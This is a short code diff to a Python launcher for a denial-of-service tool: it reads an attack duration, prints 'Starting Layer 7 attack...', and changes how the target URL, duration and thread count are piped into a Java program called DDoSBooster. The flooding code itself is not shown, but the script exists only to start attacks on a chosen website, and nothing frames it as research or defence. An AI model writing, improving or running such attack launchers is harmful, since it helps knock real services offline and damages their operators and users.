@@ -16,10 +16,16 @@ def main():
         duration = input("Enter attack duration in seconds: ")
 
         print("Starting Layer 7 attack...")
-        subprocess.run(["java", "DDoSBooster"], input=f"{target_url}\n{duration}\n{num_threads}\n", text=True)
+        # Run the Java DDoSBooster with the user inputs
+        process = subprocess.Popen(
+            ["java", "DDoSBooster"],
+            stdin=subprocess.PIPE,
+            text=True
+        )
+        process.communicate(f"{target_url}\n{duration}\n{num_threads}\n")
     else:
         print("Invalid choice.")
 
 if __name__ == "__main__":
     main()
-      
+    
